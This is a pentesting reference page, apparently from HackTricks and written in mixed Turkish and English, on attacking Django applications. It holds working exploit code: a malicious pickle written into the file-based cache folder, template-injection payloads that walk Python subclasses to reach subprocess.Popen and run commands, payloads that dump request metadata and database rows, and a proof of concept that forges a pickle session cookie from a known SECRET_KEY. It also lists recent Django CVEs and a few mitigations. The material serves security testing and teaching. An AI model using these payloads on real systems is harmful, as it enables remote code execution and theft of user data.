# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipülasyonu ile RCE
Django'nun varsayılan cache depolama yöntemi [Python pickles](https://docs.python.org/3/library/pickle.html), bu da [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf) durumunda RCE'ye yol açabilir. **Eğer bir attacker cache üzerinde yazma erişimi elde edebilirse, bu zafiyeti alttaki sunucuda RCE'ye yükseltebilir.**

Django cache dört yerden birinde saklanır: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), veya bir [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Redis sunucusunda veya database'de saklanan cache'ler en olası saldırı vektörleridir (Redis injection ve SQL injection), ancak bir attacker aynı zamanda file-based cache'i kullanarak rasgele bir yazmayı RCE'ye dönüştürebilir. Maintainers bunu non-issue olarak işaretlemişlerdir. Cache dosya klasörü, SQL tablo adı ve Redis sunucu detaylarının implementasyona göre değişeceğini not etmek önemlidir.

On **FileBasedCache**, the pickled value is written to a file under `CACHES['default']['LOCATION']` (often `/var/tmp/django_cache/`). If that directory is world-writable or attacker-controlled, dropping a malicious pickle under the expected cache key yields code execution when the app reads it:
```bash
python - <<'PY'
import pickle, os
class RCE:
def __reduce__(self):
return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```
Bu HackerOne raporu, SQLite veritabanında saklanan Django cache'inin exploiting işlemi için harika, yeniden üretilebilir bir örnek sunuyor: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.

### Tespit
1. `Template()` / `Engine.from_string()` / `render_to_string()` gibi *herhangi bir* temizlenmemiş istek verisini içeren dinamik çağrılara bakın.
2. Zaman tabanlı veya aritmetik bir payload gönderin:
```django
{{7*7}}
```
Eğer render edilmiş çıktı `49` içeriyorsa, girdi template engine tarafından derleniyor demektir.
3. DTL is **not Jinja2**: aritmetik/döngü payload'ları genellikle `TemplateSyntaxError`/500 hatası verirken yine de değerlendirme olduğunu kanıtlar. `${{<%[%'"}}%` gibi polyglot'lar çökme veya render denemeleri için iyidir.

### Context exfiltration when RCE is blocked
Even if object-walking to `subprocess.Popen` fails, DTL still exposes in-scope objects:
```django
{{ request }}               {# confirm SSTI #}
{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
{{ users }}                  {# QuerySet in the context? #}
{{ users.0 }}                {# first row #}
{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
```
`QuerySet.values()` satırları sözlüklere zorlar, `__str__`'i atlar ve queryset'in döndürdüğü tüm alanları açığa çıkarır. Bu, doğrudan Python yürütmesi filtrelendiğinde bile işe yarar.

**Automation pattern**: kimlik doğrulaması yap, CSRF token'ını al, herhangi bir kalıcı alana (örn. username/profile bio) marker-ön ekli bir payload kaydet, sonra onu render eden bir view iste (AJAX endpoint'leri, örn. `/likes/<id>`, yaygındır). Render edilen sonucu geri almak ve payload'ları yinelemek için sabit bir attribute'u (örn. `title="..."`) parse et.

### Primitive to RCE
Django doğrudan `__import__` erişimini engeller, fakat Python nesne grafiği erişilebilir:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen`'in indeksini (≈400–500 depending on Python build) bulun ve arbitrary commands çalıştırın:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Daha güvenli bir evrensel gadget, `cls.__name__ == 'Popen'` olana kadar yinelemektir.

Aynı gadget, kullanıcı girdisini yanlış işleyen **Debug Toolbar** veya **Django-CMS** şablon renderleme özellikleri için de işe yarar.

---

### Ayrıca bakınız: ReportLab/xhtml2pdf PDF export RCE
Django üzerine kurulu uygulamalar genellikle xhtml2pdf/ReportLab'i kullanarak view'ları PDF olarak dışa aktarır. Kullanıcı kontrollü HTML PDF oluşturma sürecine aktığında, rl_safe_eval üçlü parantezler `[[[ ... ]]]` içindeki ifadeleri değerlendirebilir ve kod çalıştırmaya izin verebilir (CVE-2023-33733). Detaylar, payloads, ve mitigasyonlar:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
If the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.

### Exploit Gereksinimleri
* Sunucu `PickleSerializer` kullanıyor.
* Saldırgan `settings.SECRET_KEY`'i biliyor / tahmin edebiliyor (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Ortaya çıkan cookie'yi gönderin ve payload WSGI worker'ın izinleriyle çalışır.

**Önlemler**: Varsayılan `JSONSerializer`'ı kullanmaya devam edin, `SECRET_KEY`'i döndürün ve `SESSION_COOKIE_HTTPONLY`'yi yapılandırın.

---

## Son (2023-2025) Yüksek Etkili Django CVE'leri — Pentesterlerin Kontrol Etmesi Gerekenler
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (4 Haziran 2025'te düzeltildi). Saldırganların yeni satır/ANSI kodlarını log dosyalarına kaçırmasına ve sonraki log analizini zehirlemesine olanak tanır. Yama seviyesi ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON anahtarlarını tırnaklamadan çıkacak şekilde oluşturarak rastgele SQL yürütülmesine sebep olur. 4.2.15 / 5.0.8'de düzeltildi.

Her zaman framework'ün tam sürümünü `X-Frame-Options` hata sayfası veya `/static/admin/css/base.css` hash'i üzerinden belirleyin ve yukarıdakileri uygulanabilir olduğunda test edin.

---

## Referanslar
* Django güvenlik duyurusu – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Haz 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Ağu 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
* Django docs – QuerySet.values(): [https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values)
* 0xdf: HackNet (HTB) — HTML Attribute Injection → Django SSTI → QuerySet.values data dump → Pickle FileBasedCache RCE – [https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)

{{#include ../../banners/hacktricks-training.md}}
